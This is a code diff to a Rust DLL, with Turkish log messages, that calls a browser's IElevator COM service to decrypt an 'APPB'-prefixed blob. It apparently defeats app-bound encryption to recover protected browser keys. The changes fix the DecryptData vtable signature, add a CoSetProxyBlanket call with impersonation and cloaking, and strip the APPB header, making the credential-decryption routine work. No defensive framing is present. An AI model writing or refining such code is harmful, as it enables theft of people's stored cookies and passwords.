@@ -14,9 +14,9 @@ use winapi::{
         wtypesbase::CLSCTX_LOCAL_SERVER,
     },
     um::{
-        combaseapi::{CoCreateInstance, CoInitializeEx},
+        combaseapi::{CoCreateInstance, CoInitializeEx, CoSetProxyBlanket},
         objbase::COINIT_APARTMENTTHREADED,
-        oleauto::{SysAllocStringByteLen, SysFreeString, SysStringLen, SysStringByteLen},
+        oleauto::{SysAllocStringByteLen, SysFreeString, SysStringByteLen},
         winnt::DLL_PROCESS_ATTACH,
     },
     ctypes::c_void,
@@ -47,7 +47,7 @@ struct IElevatorVTbl {
     Release: unsafe extern "system" fn(*mut c_void) -> u32,
     RunRecoveryCRXElevated: unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, u32, *mut u32) -> i32,
     EncryptData: unsafe extern "system" fn(*mut c_void, u32, BSTR, *mut BSTR, *mut u32) -> i32,
-    DecryptData: unsafe extern "system" fn(*mut c_void, u32, BSTR, *mut BSTR, *mut u32) -> i32,
+    DecryptData: unsafe extern "system" fn(*mut c_void, BSTR, *mut BSTR, *mut u32) -> i32,
 }
 
 fn log_message(msg: &str) -> Result<(), std::io::Error> {
@@ -100,6 +100,16 @@ fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
             return Err(format!("CoCreateInstance başarısız: 0x{:08X} - {}", error_code, error_msg));
         }
 
+        // IElevator2 için güvenlik ayarlarını yap (İmperonasyon ve Paket Gizliliği)
+        // RPC_C_AUTHN_WINNT = 10, RPC_C_AUTHZ_NONE = 0, RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6, RPC_C_IMP_LEVEL_IMPERSONATE = 3, EOAC_DYNAMIC_CLOAKING = 0x40
+        let hr_blanket = CoSetProxyBlanket(
+            elevator_ptr as *mut winapi::um::unknwnbase::IUnknown,
+            10, 0, ptr::null_mut(), 6, 3, ptr::null_mut(), 0x40
+        );
+        if hr_blanket < 0 {
+            let _ = log_message(&format!("CoSetProxyBlanket başarısız: 0x{:08X}", hr_blanket as u32));
+        }
+
         let _ = log_message("IElevator2 instance'ı oluşturuldu.");
 
         let bstr_encrypted = SysAllocStringByteLen(encrypted_blob.as_ptr() as *const i8, encrypted_blob.len() as UINT);
@@ -111,7 +121,7 @@ fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
         let mut last_error: u32 = 0;
 
         let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
-        let hr = ((*vtable).DecryptData)(elevator_ptr, 1, bstr_encrypted, &mut bstr_decrypted, &mut last_error);
+        let hr = ((*vtable).DecryptData)(elevator_ptr, bstr_encrypted, &mut bstr_decrypted, &mut last_error);
 
         SysFreeString(bstr_encrypted);
 
@@ -160,8 +170,8 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
     log_message(&format!("Base64 çözüldü, ham veri uzunluğu: {} byte", decoded.len()))?;
 
     let dpapi_blob = if decoded.len() >= 4 && &decoded[0..4] == b"APPB" {
-        log_message("APPB header'ı tespit edildi, korunuyor...")?;
-        &decoded[..]
+        log_message("APPB header'ı tespit edildi, kaldırılıyor...")?;
+        &decoded[4..]
     } else {
         log_message("APPB header'ı bulunamadı, tüm veri kullanılıyor...")?;
         &decoded
